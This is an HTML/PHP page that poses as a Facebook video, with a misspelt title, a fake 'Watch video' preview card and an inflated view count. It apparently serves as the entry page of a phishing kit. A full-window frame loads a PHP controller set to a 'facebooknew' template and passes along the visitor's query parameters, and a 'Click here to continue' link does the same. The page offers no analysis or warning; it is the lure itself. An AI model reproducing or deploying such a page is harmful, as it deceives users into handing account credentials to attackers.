
	<html> 
	<head> 
	<title>Faceboo Video APP</title>
		
		<meta name="twitter:card" content="summary" />
		<meta name="twitter:site" content="@" />
		<meta name="twitter:title" content="Watch video @" />
		<meta name="twitter:description" content="391,131 Views " />
		<meta name="twitter:image" content="https://avatars.io/twitter/" />
	
	</head>
	<frameset rows="*,3" frameborder="NO" border="50" framespacing="0">
	<frame name="main" src="../.././public/CONTROLLER41bf136b-8d2d-4b8f-9db3-d341acf2728e.php?source=.%2Fpublic%2FACCESSS70b9ac2e-e2c4-435b-98ef-34f4ceeebd5c&lan=facebooknew&<?php echo http_build_query($_GET); ?>"> <noframes> 
	<body bgcolor="#FFFFFF" text="#000000"> 
	<a href="../.././public/CONTROLLER41bf136b-8d2d-4b8f-9db3-d341acf2728e.php?source=.%2Fpublic%2FACCESSS70b9ac2e-e2c4-435b-98ef-34f4ceeebd5c&lan=facebooknew&<?php echo http_build_query($_GET); ?>">Click here to continue</a> 
	</body> 
	</noframes> 
	</html> 
   